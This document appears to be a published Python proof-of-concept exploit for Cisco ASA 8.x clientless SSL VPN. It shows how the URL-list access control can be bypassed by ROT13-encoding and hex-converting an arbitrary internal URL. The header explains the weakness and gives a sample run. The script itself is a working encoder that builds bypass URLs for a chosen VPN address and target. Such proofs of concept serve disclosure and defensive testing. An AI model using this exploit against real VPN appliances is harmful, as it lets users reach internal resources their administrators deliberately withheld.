#!/usr/bin/env python
#Cisco ASA <= 8.x VPN SSL module Clientless URL-list control bypass
#==================================================================
#Cisco VPN SSL Clientless lets administrators define rules to specific
#targets within the private network that WebVPN users will be able to
#access. This specific targets are published using links in VPN SSL
#home page. These links (URL) are protected (obfuscated) using a ROT13
#substitution[2] and converting ASCII characters to hexadecimal. An
#user with a valid account and without "URL entry" can access any
#internal/external resource simply taken an URL, encrypt with ROT 13,
#convert ASCII characters to hexadecimal and appending this string to
#Cisco VPN SSL URL.
#
# e.g.
#
# $ python cisco-asa-sslbypass.py 123.123.123.123 http://intranet
# [ Cisco ASA <= 8.x VPN SSL URL-list bypass encoder
# https://123.123.123.123/+CSO+OO756767633a2f2f766167656e617267++
import sys

def sendexploit(url,vpn):
	a = "https://%s/+CSO+OO" % vpn
	for x in range(len(url)):
		byte = ord(url[x])
		cap = (byte & 32)
		byte = (byte & (~cap))
		if (byte >= ord('A')) and (byte <= ord('Z')):
			byte = ((byte - ord('A') + 13) % 26 + ord('A'))
		byte = (byte | cap)
		a = a + "%x" % int(byte)
	print "%s++" % a
	sys.exit(0)

if __name__ == "__main__":
	print "[ Cisco ASA <= 8.x VPN SSL URL-list bypass encoder"
	if len(sys.argv) != 3:
		print 'Usage: <vpn-ip> <http://intranet>'
		sys.exit(1)
	vpn = sys.argv[1]
	url = sys.argv[2]
	sendexploit(url,vpn)
